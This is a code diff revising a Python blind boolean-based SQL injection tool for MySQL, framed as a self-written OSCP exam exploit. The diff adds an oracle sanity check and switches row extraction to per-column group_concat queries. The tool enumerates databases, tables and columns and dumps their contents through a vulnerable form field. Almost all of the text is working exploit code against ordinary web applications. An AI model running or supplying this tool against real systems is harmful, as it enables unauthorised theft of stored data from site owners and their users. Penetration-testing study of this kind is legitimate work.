@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 # ---------------------------------------------------------------------------
-# Blind boolean-based SQLi dumper (MySQL) - interactive, live rolling output
+# Blind boolean-based SQLi dumper (MySQL) - interactive, live output
 # Oracle = TRUE/FALSE difference in the HTTP response.
 # Binary search on ASCII per character (~8 requests/char, 0-255 range).
 # Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
-# Values roll in char-by-char (sqlmap style); row data prints as an ASCII table.
+# Uses the proven group_concat pattern (one query per table, no LIMIT loop).
 # Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
 # ---------------------------------------------------------------------------
 import requests
@@ -23,16 +23,29 @@ TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
 # Its ABSENCE from the response = condition TRUE.
 FALSE_MARKER = input("String shown only on FALSE/failed response   : ").strip()
 
+# --- Startup oracle sanity check (fails loudly instead of dumping garbage) --
+print("\n[*] Sanity check...")
+def _probe(cond):
+    p = TEMPLATE.replace("[INJECT]", cond)
+    r = requests.post(URL, data={INJ_FIELD: p, OTHER_FIELD: OTHER_VALUE})
+    return FALSE_MARKER not in r.text
+if not (_probe("1=1") and not _probe("1=2")):
+    print("[!] Oracle FAILED: 1=1 should be TRUE and 1=2 FALSE.")
+    print(f"    template = {TEMPLATE!r}")
+    print(f"    marker   = {FALSE_MARKER!r}")
+    sys.exit(1)
+print("[+] Oracle works (1=1 TRUE, 1=2 FALSE).\n")
+
 # MySQL system schemas to skip when dumping "all" (still listed on screen)
 SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
 
-session = requests.Session()
-
 # --- Core oracle -----------------------------------------------------------
 def oracle(condition):
-    """Send one boolean condition, return True if the app signals TRUE."""
+    """Send one boolean condition, return True if the app signals TRUE.
+    Stateless (no session) so a 'success' response never leaves a cookie
+    that would make later requests all look logged-in."""
     payload = TEMPLATE.replace("[INJECT]", condition)
-    r = session.post(URL, data={INJ_FIELD: payload, OTHER_FIELD: OTHER_VALUE})
+    r = requests.post(URL, data={INJ_FIELD: payload, OTHER_FIELD: OTHER_VALUE})
     return FALSE_MARKER not in r.text
 
 def extract_char(subquery, pos):
@@ -46,39 +59,32 @@ def extract_char(subquery, pos):
             hi = mid
     return lo
 
-def extract_string(subquery, label=None):
+def extract_string(subquery, label=None, roll=True):
     """Pull a string char by char until a NULL/empty char (0) ends it.
-    If label is given, redraw the growing value on one line (rolling output)."""
+    roll=True  -> redraw the growing value on one line (for single-line names).
+    roll=False -> stream chars as-is (for multi-line data blobs with newlines)."""
     out, pos = "", 1
     while True:
         val = extract_char(subquery, pos)
-        if val == 0:                      # past end of string -> done
+        if val == 0:
             break
-        out += chr(val)
+        ch = chr(val)
+        out += ch
         if label is not None:
-            sys.stdout.write(f"\r{label}{out}")   # \r rewrites the same line
+            if roll:
+                sys.stdout.write(f"\r{label}{out}")
+            else:
+                if pos == 1:
+                    sys.stdout.write(label)
+                sys.stdout.write(ch)
             sys.stdout.flush()
         pos += 1
     if label is not None:
         sys.stdout.write("\n")
     return out
 
-def extract_number(subquery):
-    """Binary search a numeric value directly (used for row counts)."""
-    lo, hi = 0, 1
-    while oracle(f"({subquery})>{hi}"):     # grow the ceiling first
-        hi *= 2
-    while lo < hi:
-        mid = (lo + hi) // 2
-        if oracle(f"({subquery})>{mid}"):
-            lo = mid + 1
-        else:
-            hi = mid
-    return lo
-
 # --- ASCII table renderer --------------------------------------------------
 def render_table(headers, rows):
-    """Print rows as an aligned ASCII table."""
     widths = [len(h) for h in headers]
     for row in rows:
         for i in range(len(headers)):
@@ -118,22 +124,23 @@ def dump_table(db, table):
     if not cols:
         print(f"      (no columns found for {db}.{table})")
         return
-    # concat_ws joins columns with | ; 0x7c is hex for | (avoids quote issues).
-    # Per-row LIMIT avoids group_concat's 1024-byte truncation on big tables.
-    col_expr = "concat_ws(0x7c," + ",".join(cols) + ")"
-    rows_n = extract_number(f"SELECT count(*) FROM {db}.{table}")
-    print(f"      ({rows_n} row(s))")
-    data = []
-    for i in range(rows_n):
-        row_q = f"SELECT {col_expr} FROM {db}.{table} LIMIT {i},1"
-        raw = extract_string(row_q, label=f"    row {i}: ")   # live rolling
-        data.append(raw.split("|"))
+    # Dump each column separately with single-arg group_concat -- the SAME
+    # query shape that reliably dumps schema/table/column names above.
+    # Values within a column are comma-joined; we split and zip into rows.
+    # (Caveat: a value containing a comma would misalign that column.)
+    columns_data = []
+    for c in cols:
+        q = f"SELECT group_concat({c}) FROM {db}.{table}"
+        s = extract_string(q, label=f"    {c}: ")
+        columns_data.append(s.split(",") if s else [])
+    n = max((len(cd) for cd in columns_data), default=0)
+    rows = [[cd[i] if i < len(cd) else "" for cd in columns_data] for i in range(n)]
     print()
-    render_table(cols, data)                                  # clean summary
+    render_table(cols, rows)
+
 
 # --- Interactive chooser ---------------------------------------------------
 def choose(items, label):
-    """Show a numbered list; return the full list (all) or a one-item list."""
     print(f"\nAvailable {label}s:")
     print("   0) ALL")
     for idx, it in enumerate(items, 1):
@@ -148,7 +155,7 @@ def choose(items, label):
 
 # --- Main walk -------------------------------------------------------------
 def main():
-    print("\n[*] Enumerating databases...")
+    print("[*] Enumerating databases...")
     all_dbs = get_databases()
     print(f"[+] Found: {', '.join(all_dbs)}")
 
@@ -161,7 +168,6 @@ def main():
         if not tables:
             print("    (no tables)")
             continue
-        # only prompt per-table when a single DB was chosen
         if len(chosen_dbs) == 1:
             tables = choose(tables, "table")
 
